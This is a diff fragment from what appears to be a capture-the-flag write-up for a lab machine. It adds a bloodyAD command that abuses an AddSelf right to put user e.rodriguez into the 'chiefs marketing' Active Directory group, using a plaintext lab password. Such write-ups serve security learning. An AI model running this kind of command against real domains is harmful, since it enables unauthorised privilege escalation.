@@ -387,7 +387,7 @@ This user has AddSelf to the chiefs marketing group
 # Adding `e.rodriguez` to `chiefs marketing`
 
 ```python
-
+bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -u e.rodriguez -p 'Password123!' add groupMember 'CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB' 'e.rodriguez'
 ```
 
 
